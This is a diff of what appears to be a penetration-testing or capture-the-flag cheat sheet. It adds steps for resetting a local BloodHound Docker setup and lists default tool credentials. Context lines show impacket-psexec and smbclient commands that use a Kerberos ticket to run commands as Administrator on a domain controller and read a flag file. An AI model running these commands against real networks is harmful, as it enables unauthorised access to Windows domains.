@@ -137,11 +137,13 @@ impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 export KRB5CCNAME=`pwd`/administrator.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
 
 ## Start Bloodhound
+Set-Location "$env:USERPROFILE\Downloads"; docker compose down; docker volume rm @(docker volume ls -q | Select-String neo4j-data); docker compose up
 .\bloodhound-cli resetpwd
 http://127.0.0.1:7474
 neo4j:bloodhoundcommunityedition
 http://127.0.0.1:8080
 admin:RANDOM_PASSWORD
+
 
 ## Create Custom Usernames
 username-anarchy --input-file usernames --select-format first,flast,f.last,first.last,firstlast > .tmp; cat .tmp | tee usernames; rm .tmp
